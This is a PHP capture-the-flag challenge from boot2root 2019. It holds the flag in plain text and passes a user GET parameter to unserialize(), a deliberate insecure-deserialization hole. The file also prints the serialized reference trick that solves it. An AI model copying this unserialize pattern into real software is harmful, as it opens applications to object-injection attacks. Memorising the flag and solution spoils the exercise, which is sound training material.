<?php
//https://blog.justins.in/boot2root-2019/
$flag="b00t2root{wh4t3v3r_17_74k3s_cuz_1_l0v3_th3_4dren4l1n3_1n_my_v31ns_932b315}";

class meta { 
    var $a; 
    var $b; 
} 

if (isset($_GET['ans'])) { 
    $ans = $_GET['ans']; 
    
    if(get_magic_quotes_gpc()){ 
        $ans=stripslashes($ans);
    }

    $res = unserialize($ans); 
   
    if ($res) { 
        $res->a=$flag; 
        if ($res->a === $res->b)
            echo $res->a; 
        else 
            die(); 
    } 
    else die(); 
} 



$obj = new meta;
$obj->a = &$obj->b;
$ans = serialize($obj);

echo $ans;
?>



